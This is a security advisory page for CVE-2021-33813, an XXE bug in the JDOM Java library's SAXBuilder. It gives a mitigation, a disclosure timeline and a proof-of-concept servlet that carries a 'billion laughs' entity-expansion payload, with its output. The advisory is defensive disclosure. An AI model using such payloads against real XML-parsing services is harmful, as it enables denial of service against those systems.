<!DOCTYPE html>
<html lang="en">
<head>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-92665328-1"></script>
<script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        
        gtag('config', 'UA-92665328-1');
    </script>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<title>[CVE-2021-33813] XXE in JDOM library - Java</title>
<meta name="name" content="CVE-2021-33813">
<meta name="description" content="XXE in JDOM library - Java">
<meta name="image" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@alephsecurity">
<meta name="twitter:creator" content="@alephsecurity">
<meta name="twitter:title" content="CVE-2021-33813">
<meta name="twitter:url" content="https://alephsecurity.com/vulns/aleph-2021003">
<meta name="twitter:description" content="XXE in JDOM library - Java">
<meta name="twitter:image:src" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta property="og:site_name" content="">
<meta property="og:title" content="CVE-2021-33813">
<meta property="og:type" content="article">
<meta property="og:description" content="XXE in JDOM library - Java">
<meta property="og:url" content="https://alephsecurity.com/vulns/aleph-2021003">
<meta property="article:published_time" content="2021-06-03T00:00:00+00:00">
<meta property="article:author" content="https://alephsecurity.com">
<meta property="og:image" content="https://alephsecurity.com/assets/img/logo-black.png">
<link rel="icon" href="/favicon.png">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inconsolata:400,700">
<link rel="stylesheet" type="text/css" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      messageStyle: "none",
      tex2jax: {preview: "none"},
      CommonHTML: { linebreaks: { automatic: true } },
      "HTML-CSS": { linebreaks: { automatic: true } },
      SVG: { linebreaks: { automatic: true } }
    });
    </script>
<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
    </script>
</head>
<body>
<div class="wrapper">
<div class="page__back">
<a href="/">&lt;-- <span class="smallogo">◊ê</span></a>
</div>
<div class="page">
<div class="advisory">
<div class="advisory__title">
<h1>XXE in JDOM library - Java</h1>
</div>
<div class="advisory__subtitle">
Aleph Research Advisory
</div>
<div class="advisory__meta">
<p></p>
</div>
<h2>Identifier</h2>
<div class="cve-moderate"><span class="" title="XXE in JDOM library - Java"><a href="/vulns/aleph-2021003">CVE-2021-33813</a></span></div>
<h2>Severity</h2>
Moderate
<h2>Product</h2>
<ul>
<li>JDOM library</li>
</ul>
<h2>Vulnerable Version</h2>
<ul>
<li>JDOM-2.0.6 and before</li>
</ul>
<h2>Technical Details</h2>
<div class="advisory__content" ?>
<p>While working with the JDOM library, We have found a bug in SAXBuilder class that might lead to an XXE vulnerability.
According to OWASP, to avoid XXE vulnerability, we need to configure the parser not to allow external entities by
using setFeature() method with the following values:</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">parser</span><span class="o">.</span><span class="na">setFeature</span><span class="o">(</span><span class="s">"http://xml.org/sax/features/external-general-entities"</span><span class="o">,</span> <span class="kc">false</span><span class="o">).</span>
</code></pre></div></div>
<p>We have found that it does not matter which value is set in this feature. Whether it is true or false,
external-general-entities will use the value from the Expand Entity.</p>
<p>Our suggested code fix is that setting user-specified features should be done after the set entity expansion. Since that user-specified configuration should have higher priority to avoid XXE.</p>
<p>Our mitigation, until a version fix is out, is to add configuration for ExpandEntity that should protect the parser from XXE:</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">builder</span><span class="o">.</span><span class="na">setExpandEntities</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
</code></pre></div></div>
<p>Exploit example for the XXE bomb attack(billion laughs attack):</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">test_SAXBuilder</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
 
    <span class="nc">String</span> <span class="n">xmlParam</span> <span class="o">=</span> <span class="s">"&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY bar \"World \"&gt;
	&lt;!ENTITY t1 \"&amp;bar;&amp;bar;\"&gt;&lt;!ENTITY t2 \"&amp;t1;&amp;t1;&amp;t1;&amp;t1;\"&gt;
	&lt;!ENTITY t3 \"&amp;t2;&amp;t2;&amp;t2;&amp;t2;&amp;t2;\"&gt;]&gt;&lt;foo&gt;Hello &amp;t3;&lt;/foo&gt;"</span><span class="o">;</span>
    
    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">// disallow-doctype-decl is set to true and after parsing will hold value true</span>
        <span class="nc">SAXBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SAXBuilder</span><span class="o">();</span>
        <span class="n">builder</span><span class="o">.</span><span class="na">setFeature</span><span class="o">(</span><span class="s">"http://xml.org/sax/features/external-general-entities"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
        <span class="n">builder</span><span class="o">.</span><span class="na">setFeature</span><span class="o">(</span><span class="s">"http://xml.org/sax/features/external-parameter-entities"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
        <span class="c1">//builder.setExpandEntities(false);</span>
        <span class="nc">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="nc">StringReader</span><span class="o">(</span><span class="n">xmlParam</span><span class="o">)));</span>
        <span class="nc">String</span> <span class="n">s</span><span class="o">=</span><span class="s">""</span><span class="o">;</span>
        <span class="k">for</span> <span class="o">(</span> <span class="nc">Content</span> <span class="n">content</span> <span class="o">:</span> <span class="n">doc</span><span class="o">.</span><span class="na">getContent</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">s</span> <span class="o">+=</span> <span class="n">content</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">"external-general-entities: true, content: "</span> <span class="o">+</span> <span class="n">s</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">JDOMException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="o">}</span>
 
    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">// disallow-doctype-decl is set to false and after parsing will hold value true</span>
        <span class="nc">SAXBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SAXBuilder</span><span class="o">();</span>
        <span class="n">builder</span><span class="o">.</span><span class="na">setFeature</span><span class="o">(</span><span class="s">"http://xml.org/sax/features/external-general-entities"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
        <span class="n">builder</span><span class="o">.</span><span class="na">setFeature</span><span class="o">(</span><span class="s">"http://xml.org/sax/features/external-parameter-entities"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
        <span class="c1">//builder.setExpandEntities(false);</span>
        <span class="nc">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="nc">StringReader</span><span class="o">(</span><span class="n">xmlParam</span><span class="o">)));</span>
        <span class="nc">String</span> <span class="n">s</span><span class="o">=</span><span class="s">""</span><span class="o">;</span>
        <span class="k">for</span> <span class="o">(</span> <span class="nc">Content</span> <span class="n">content</span> <span class="o">:</span> <span class="n">doc</span><span class="o">.</span><span class="na">getContent</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">s</span> <span class="o">+=</span> <span class="n">content</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">"external-general-entities: false, content: "</span> <span class="o">+</span> <span class="n">s</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">JDOMException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="o">}</span>
 
    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">// disallow-doctype-decl is set to true and after parsing will hold value false</span>
        <span class="c1">// due to expandEntity value</span>
        <span class="nc">SAXBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SAXBuilder</span><span class="o">();</span>
        <span class="n">builder</span><span class="o">.</span><span class="na">setFeature</span><span class="o">(</span><span class="s">"http://xml.org/sax/features/external-general-entities"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
        <span class="n">builder</span><span class="o">.</span><span class="na">setFeature</span><span class="o">(</span><span class="s">"http://xml.org/sax/features/external-parameter-entities"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
        <span class="n">builder</span><span class="o">.</span><span class="na">setExpandEntities</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
        <span class="nc">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="nc">StringReader</span><span class="o">(</span><span class="n">xmlParam</span><span class="o">)));</span>
        <span class="nc">String</span> <span class="n">s</span><span class="o">=</span><span class="s">""</span><span class="o">;</span>
        <span class="k">for</span> <span class="o">(</span> <span class="nc">Content</span> <span class="n">content</span> <span class="o">:</span> <span class="n">doc</span><span class="o">.</span><span class="na">getContent</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">s</span> <span class="o">+=</span> <span class="n">content</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">"external-general-entities: true, ExpandEntities: false, content: "</span> <span class="o">+</span> <span class="n">s</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">JDOMException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="o">}</span>
  <span class="k">try</span> <span class="o">{</span>
        <span class="c1">// disallow-doctype-decl is set to true and after parsing will hold value false</span>
        <span class="c1">// due to expandEntity value</span>
        <span class="nc">SAXBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SAXBuilder</span><span class="o">();</span>
        <span class="n">builder</span><span class="o">.</span><span class="na">setFeature</span><span class="o">(</span><span class="s">"http://xml.org/sax/features/external-general-entities"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
        <span class="n">builder</span><span class="o">.</span><span class="na">setFeature</span><span class="o">(</span><span class="s">"http://xml.org/sax/features/external-parameter-entities"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
        <span class="n">builder</span><span class="o">.</span><span class="na">setExpandEntities</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
        <span class="nc">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="nc">StringReader</span><span class="o">(</span><span class="n">xmlParam</span><span class="o">)));</span>
        <span class="nc">String</span> <span class="n">s</span><span class="o">=</span><span class="s">""</span><span class="o">;</span>
        <span class="k">for</span> <span class="o">(</span> <span class="nc">Content</span> <span class="n">content</span> <span class="o">:</span> <span class="n">doc</span><span class="o">.</span><span class="na">getContent</span><span class="o">())</span> <span class="o">{</span>
             <span class="n">s</span> <span class="o">+=</span> <span class="n">content</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">"external-general-entities: true, ExpandEntities: false,  content: "</span> <span class="o">+</span> <span class="n">s</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">JDOMException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>The output html is:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    external-general-entities: true, content: Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World 
    external-general-entities: false, content: Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World 
    external-general-entities: true, ExpandEntities: false, content: Hello
    external-general-entities: false, ExpandEntities: false, content: Hello
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
</div>
<h2>Timeline</h2>
<div class="list"><ul><li><div class="list__date"><span>08-Jun-21<span></div>: Public disclosure.</li><li><div class="list__date"><span>03-Jun-21<span></div>: <span class="cve-moderate" title="XXE in JDOM library - Java"><a href="/vulns/aleph-2021003">CVE-2021-33813</a></span> assigned.</li><li><div class="list__date"><span>02-Jun-21<span></div>: CVE ID requested.</li><li><div class="list__date"><span>16-May-21<span></div>: Deadline.</li><li><div class="list__date"><span>16-Feb-21<span></div>: Reported.</li></ul></div>
<h2>Credit</h2>
<div class="list">
<ul>
<li>
<a href="/authors/estib">Esti Burstein</a> of Aleph Research, HCL Technologies
</li>
</ul>
</div>
<h2>External References</h2>
<div class="numberedlist">
<ol>
<li>
<a href="https://github.com/hunterhacker/jdom/pull/188">JDOM XXE branch fix PR</a>
</li>
</ol>
</div>
</div>
</div>
</div>
</body>
</html>
